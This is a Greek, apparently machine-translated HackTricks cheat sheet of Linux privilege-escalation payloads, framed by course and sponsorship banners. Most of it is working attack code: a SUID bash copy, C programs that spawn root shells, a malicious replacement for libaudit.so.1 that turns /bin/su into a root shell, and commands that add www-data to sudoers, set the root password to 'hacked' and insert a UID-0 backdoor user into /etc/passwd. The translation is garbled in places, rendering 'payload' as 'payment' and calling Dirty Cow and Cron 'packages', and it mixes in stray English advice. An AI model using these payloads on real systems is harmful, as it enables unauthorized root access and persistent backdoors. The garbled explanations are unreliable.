# Φορτία για εκτέλεση

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## Εκτέλεση πληρωμής

Στην παρακάτω λίστα παρουσιάζονται διάφορα πακέτα που μπορούν να χρησιμοποιηθούν για να εκτελέσουν πληρωμές σε ένα σύστημα Linux. Αυτά τα πακέτα εκμεταλλεύονται ευπάθειες στο σύστημα για να αποκτήσουν αυξημένα δικαιώματα.

### 1. Dirty Cow

Το Dirty Cow είναι ένα εκμεταλλευόμενο πακέτο που εκμεταλλεύεται μια ευπάθεια στον πυρήνα Linux γνωστή ως "Copy-on-Write" (COW). Αυτό το πακέτο μπορεί να χρησιμοποιηθεί για να αλλάξει τα δικαιώματα ενός αρχείου και να εκτελέσει κακόβουλο κώδικα με αυξημένα δικαιώματα.

### 2. Sudo

Το πακέτο Sudo είναι ένα εργαλείο που επιτρέπει σε χρήστες να εκτελούν εντολές με δικαιώματα υπερχρήστη. Αυτό το πακέτο μπορεί να εκμεταλλευτείται για να εκτελέσει κακόβουλο κώδικα με δικαιώματα υπερχρήστη.

### 3. Cron

Το Cron είναι ένα πρόγραμμα που επιτρέπει την αυτόματη εκτέλεση εργασιών σε ένα σύστημα Linux. Αυτό το πακέτο μπορεί να εκμεταλλευτείται για να εκτελέσει κακόβουλο κώδικα με δικαιώματα υπερχρήστη.

### 4. Setuid

Το Setuid είναι ένα χαρακτηριστικό που επιτρέπει σε ένα εκτελέσιμο αρχείο να εκτελείται με τα δικαιώματα του κατόχου του αρχείου. Αυτό το πακέτο μπορεί να εκμεταλλευτείται για να εκτελέσει κακόβουλο κώδικα με δικαιώματα υπερχρήστη.

### 5. LD_PRELOAD

Το LD_PRELOAD είναι μια μεταβλητή περιβάλλοντος που επιτρέπει την προσάρτηση ενός κατακερματισμένου αρχείου κώδικα σε ένα εκτελέσιμο αρχείο. Αυτό το πακέτο μπορεί να εκμεταλλευτείται για να εκτελέσει κακόβουλο κώδικα με δικαιώματα υπερχρήστη.
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Αντικατάσταση ενός αρχείου για ανέλιξη προνομίων

### Συνηθισμένα αρχεία

* Προσθήκη χρήστη με κωδικό πρόσβασης στο _/etc/passwd_
* Αλλαγή κωδικού πρόσβασης μέσα στο _/etc/shadow_
* Προσθήκη χρήστη στους sudoers στο _/etc/sudoers_
* Κατάχρηση του Docker μέσω του Docker socket, συνήθως στο _/run/docker.sock_ ή _/var/run/docker.sock_

### Αντικατάσταση μιας βιβλιοθήκης

Ελέγξτε μια βιβλιοθήκη που χρησιμοποιείται από κάποιο δυαδικό αρχείο, σε αυτήν την περίπτωση `/bin/su`:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
Σε αυτήν την περίπτωση ας προσπαθήσουμε να προσωποποιήσουμε το `/lib/x86_64-linux-gnu/libaudit.so.1`.\
Έτσι, ελέγξτε τις συναρτήσεις αυτής της βιβλιοθήκης που χρησιμοποιούνται από το δυαδικό **`su`**:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
Τα σύμβολα `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` και `audit_fd` πιθανότατα προέρχονται από τη βιβλιοθήκη libaudit.so.1. Καθώς η libaudit.so.1 θα αντικατασταθεί από την κακόβουλη κοινόχρηστη βιβλιοθήκη, αυτά τα σύμβολα πρέπει να υπάρχουν στη νέα κοινόχρηστη βιβλιοθήκη, διαφορετικά το πρόγραμμα δεν θα μπορεί να βρει το σύμβολο και θα τερματίσει.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Τώρα, απλά καλώντας **`/bin/su`** θα λάβετε ένα κέλυφος ως root.

## Σενάρια

Μπορείτε να κάνετε τον root να εκτελέσει κάτι;

### **www-data στους sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
To change the root password, you can use the following command:

```bash
sudo passwd root
```

You will be prompted to enter the new password twice. After successfully changing the password, you can log in as root using the new password.
```bash
echo "root:hacked" | chpasswd
```
### Προσθήκη νέου χρήστη root στο αρχείο /etc/passwd

To add a new root user to the /etc/passwd file, follow these steps:

1. Open the /etc/passwd file using a text editor.
2. Scroll to the end of the file and add a new line.
3. Enter the username for the new root user. For example, `newroot`.
4. Set the password field to an encrypted password or an asterisk (`*`) to disable password authentication.
5. Set the user ID (UID) field to `0` to assign root privileges to the user.
6. Set the group ID (GID) field to `0` to assign the user to the root group.
7. Enter a description or comment for the user (optional).
8. Set the home directory field to the desired directory for the new root user.
9. Set the login shell field to the desired shell for the new root user.
10. Save the changes and exit the text editor.

After adding the new root user to the /etc/passwd file, you can use the credentials to log in as root and perform administrative tasks.
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
